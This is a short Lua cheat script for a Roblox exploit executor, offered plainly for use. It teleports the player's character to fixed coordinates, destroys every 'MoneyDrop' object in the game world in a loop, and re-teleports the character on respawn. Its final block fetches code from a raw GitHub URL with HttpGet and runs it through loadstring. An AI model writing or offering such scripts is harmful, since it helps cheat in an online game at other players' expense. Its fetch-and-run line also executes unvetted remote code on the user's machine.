local vers = "b1.9"
local PLR = game:GetService("Players").LocalPlayer
local HRP = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart

coroutine.wrap(function()
    print(vers)
    HRP.CFrame = CFrame.new(-869.63232421875, -38.302879333496, -586.50354003906) + Vector3.new(0, 4, 0)

    coroutine.wrap(function()
        repeat
            for i, v in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
                    if v.Name == "MoneyDrop" then
                        v:Destroy()
                    end
                end
            wait(5)
            until false
    end)()

    coroutine.wrap(function()
        PLR.CharacterAdded:Connect(function(char)
            char:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(-870, -38, -586) + Vector3.new(0, 5, 0)
        end)
    end)()

    coroutine.wrap(function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/W9K/roblox-scripts/main/exec'))()
    end)()

end)()
